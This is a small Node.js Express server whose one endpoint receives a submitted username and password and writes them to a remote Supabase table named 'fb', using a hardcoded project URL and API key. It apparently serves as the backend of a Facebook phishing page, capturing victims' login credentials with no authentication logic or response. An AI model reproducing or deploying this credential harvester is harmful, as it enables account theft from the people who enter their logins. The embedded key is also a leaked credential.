let express = require('express');

let app = express();
let fs = require('fs');
let {createClient} = require('@supabase/supabase-js');
let cors = require('cors');

app.use(cors());


app.use(express.json());


let url = 'https://gnaqwcyeeqqkqwxcxbcg.supabase.co';

let key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImduYXF3Y3llZXFxa3F3eGN4YmNnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE4NTcyOTksImV4cCI6MjA2NzQzMzI5OX0.hvw2ACL-3a7EGvFH1XRvlYu77IGSjB1uOvY94nJXu28';

let cliente = createClient(url,key);




app.post('/enviar', (req,res) => {
    
   let us = req.body.usuario;
   let co = req.body.contraseña;
   
   cliente.from('fb').insert([{
   
   usuario:us,
   contraseña:co
   
   }]).then(resp => {
       
       
       if (!resp.error) {
           
           console.log('guardado:')
           
       }
       
       
   });
   
   
   
   
});

app.listen(3000,'0.0.0.0', () => {
    
    console.log('Escuchando puerto: 3000...')
    
});
